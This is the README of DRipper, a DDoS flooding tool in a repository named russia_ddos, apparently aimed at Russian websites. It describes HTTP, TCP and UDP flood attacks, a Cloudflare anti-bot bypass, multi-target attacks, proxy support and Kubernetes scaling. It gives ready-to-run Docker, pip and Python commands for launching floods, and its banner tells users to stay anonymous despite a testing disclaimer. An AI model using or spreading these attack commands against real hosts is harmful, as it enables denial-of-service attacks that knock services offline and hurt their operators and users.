# DRipper

[![Build status][actions build badge]][actions build link]
[![Docker Pulls][docker pulls badge]][docker pulls link]
[![Docker Image Version (latest semver)][dockerhub badge]][dockerhub link]
[![License: MIT][license badge]][license link]

DESCRIPTION
-----------

This is reworked version of [DRipper](https://gist.github.com/scamp/33807688d0ebdcfbd4c29a4b992a8b54).
This script support HTTP/TCP/UDP flood attack. We recommend using this script for your own test purposes in the local (on-premise) environment to improve your own web services against DDoS attacks.

## Prerequisites

- Python 3.9 or higher
- Docker (optional) if you'd like to run script with docker

## Features

### Attacks

- HTTP Flood - OSI Layer 7 method volumetric attack type
- HTTP Bypass - OSI Layer 7 method volumetric attack type with to bypass Cloudflare's anti-bot page (also known as "I'm Under Attack Mode", or IUAM)
- TCP Flood - OSI Layer 4 method volumetric attack type
- UDP Flood - OSI Layer 4 method volumetric attack type

### Other features

- Multiple targets support - the script can attack multiple targets at the same time
- Detailed statistics with deep attack log for better attack analysis during the attack
- Display average request rate and throughput
- Periodic checks of your public IP address to ensure your privacy and VPN connection survivability.
- Automatic and periodic checks for the availability of the attacked host
- Distributed statistics of the response code for the attacked host, which helps you to understand the effectiveness of attacks
- Detection of redirects and rate limits with alerts in the event log

## How it looks

```bash
───────────────────────────────────────── Starting DRipper ─────────────────────────────────────────
[23:17:39] (1/3) tcp://www.site1.ru:80/ (192.168.0.101:80) Trying to connect...      services.py:135
           (1/3) tcp://www.site1.ru:80/ (192.168.0.101:80) Connected                 services.py:138
           (1/3) https://www.site2.ru:443/ (192.168.0.102:443) Trying to connect...  services.py:135
           (1/3) https://www.site2.ru:443/ (192.168.0.102:443) Connected             services.py:138
────────────────────────────────────────────────────────────────────────────────────────────────────


                        ██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
                        ██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
                        ██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
                        ██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
                        ██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
                        ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                    v2.5.0

                  It is the end user's responsibility to obey all applicable laws.
                  It is just like a server testing script and Your IP is visible.
                                Please, make sure you are ANONYMOUS!

                             https://github.com/alexmon1989/russia_ddos


 ──────────────────────────────────────────────────────────────────────────────────────────────────
  Description                                 Status
 ──────────────────────────────────────────────────────────────────────────────────────────────────
  Start Time, Duration                        2022-04-08 23:17:29  (0:00:14)
  Your Country, Public IP                     DK   45.***.***.***
  Total Threads                               200
  vCPU Count                                  8
  Socket Timeout (seconds)                    1
 ──────────────────────────────────────────────────────────────────────────────────────────────────
  Target (tcp://www.site1.ru:80/)             1/2 (next in 1)
 ──────────────────────────────────────────────────────────────────────────────────────────────────
  Country, Host IP                            RU  192.168.0.101:80 (target-0)
  Attack Method                               TCP-FLOOD
  Random Packet Length (bytes)                From 1 to 1024
  Threads                                     100
  CloudFlare Protection                       Not protected
  Availability (check-host.net)               ...detecting (TCP method)
  Sent Bytes @ AVG speed                      1.73 MB @ 119.76 kB/s
  Sent Packets @ AVG speed                      3,531 @ 238 packets/s
  Connections                                 success: 100, failed: 0, success rate: 100 %
 ──────────────────────────────────────────────────────────────────────────────────────────────────

  Events Log
 ──────────────────────────────────────────────────────────────────────────────────────────────────
  [23:17:40]   info   target-0  thread-14   Creating new TCP connection...
  [23:17:40]   info   target-0  thread-114  Creating new TCP connection...
  [23:17:40]   info   target-0  thread-16   Creating new TCP connection...
  [23:17:40]   info   target-0  thread-20   Creating new TCP connection...
  [23:17:40]   info   target-0  thread-22   Creating new TCP connection...

                                 Press CTRL+C to interrupt process.

                                         #StandWithUkraine
```

## Usage

DRipper can run on Windows/Linux/macOS from command line.
We recommend to use `PowerShell` for Windows users to run the script, Linux/macOS users can use any shell.

Run `dripper --help` to see detailed params description.

```bash
Usage: DRipper.py [options] arg

Options:
  --version                                             show program's version number and exit
  -h, --help                                            show this help message and exit
  -s TARGETS, --targets=TARGETS                         Attack target in {scheme}://{hostname}[:{port}][{path}] format.
                                                        Multiple targets allowed.
  -m ATTACK_METHOD, --method=ATTACK_METHOD              Attack method: udp-flood, tcp-flood, http-flood, http-bypass
  -e HTTP_METHOD, --http-method=HTTP_METHOD             HTTP method. Default: GET
  -t THREADS_COUNT, --threads=THREADS_COUNT             Total threads count. Default: 100
  --min-random-packet-len=MIN_RANDOM_PACKET_LEN
                                                        Min random packets length. Default: 1 for udp/tcp
  -l MAX_RANDOM_PACKET_LEN, --max-random_packet-len=MAX_RANDOM_PACKET_LEN
                                                        Max random packets length. Default: 1024 for udp/tcp
  -y PROXY_LIST, --proxy-list=PROXY_LIST                File (fs or http/https) with proxies in
                                                        ip:port:username:password line format. Proxies will be ignored
                                                        in udp attack!
  -k PROXY_TYPE, --proxy-type=PROXY_TYPE                Type of proxy to work with. Supported types: socks5, socks4,
                                                        http. Default: socks5
  -c HEALTH_CHECK, --health-check=HEALTH_CHECK          Controls health check availability. Turn on: 1, turn off: 0.
                                                        Default: 1
  -o SOCKET_TIMEOUT, --socket-timeout=SOCKET_TIMEOUT    Timeout for socket connection is seconds. Default (seconds): 1
                                                        without proxy, 2 with proxy                                                    
  --dry-run                                             Print formatted output without full script running.
  --log-size=LOG_SIZE                                   Set the Events Log history frame length.
  --log-level=EVENT_LEVEL                               Log level for events board. Supported levels: info, warn, error,
                                                        none.
  -d DURATION_SECONDS, --duration=DURATION_SECONDS      Attack duration in seconds. After this duration script will 
                                                        stop its execution.                                                   

Example: dripper -t 100 -m tcp-flood -s tcp://192.168.0.1:80
```

## How to Run

#### Using Docker

```bash
# HTTP flood
docker run -it --rm alexmon1989/dripper:latest -t 100 -m http-flood -s http://127.0.0.1:80 
# or
docker run -it --rm alexmon1989/dripper:latest -t 100 -s http://127.0.0.1:80
# or even
docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1

# TCP flood
docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s tcp://127.0.0.1:80 

# UDP flood
docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s udp://127.0.0.1:80 
```

#### Directly with Python.

Ensure you have Python 3.9 or better installed. Then clone this repo and run DRipper.py with params you need

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# Install dependencies
python3 -m pip install --upgrade pip git+https://github.com/alexmon1989/russia_ddos.git
# Run script
dripper -t 100 -s udp://127.0.0.1:80


# ===== Alternative variant =====

# Install python dependencies:
pip install -r requirements.txt
# Run script
python3 DRipper.py -t 100 -s udp://127.0.0.1:80
```

#### Kubernetes

You can deploy and run DRipper in Kubernetes cluster using [kube-dripper][kube-dripper-link] terraform configuration.
For details - see the [README][kube-dripper-readme] from **kube-dripper** project.

## How to run unit tests

#### Prepare
```bash
pip install -r requirements.test.txt
```

#### Run
```bash
pytest

# with code coverage report:
pytest --cov-report=html:./htmlcov
```

# License

This project is distributed under the MIT License, see [LICENSE](./LICENSE) for more information.

<!-- External links -->
[actions build badge]: https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml/badge.svg
[actions build link]:  https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml

[docker pulls link]:   https://hub.docker.com/r/alexmon1989/dripper
[docker pulls badge]:  https://img.shields.io/docker/pulls/alexmon1989/dripper
[dockerhub link]:      https://hub.docker.com/r/alexmon1989/dripper/tags
[dockerhub badge]:     https://img.shields.io/docker/v/alexmon1989/dripper?label=DockerHub

[kube-dripper-link]:   https://github.com/denismakogon/kube-dripper
[kube-dripper-readme]: https://github.com/denismakogon/kube-dripper/blob/main/README.md

[license badge]:       https://img.shields.io/badge/License-MIT-yellow.svg
[license link]:        ./LICENSE
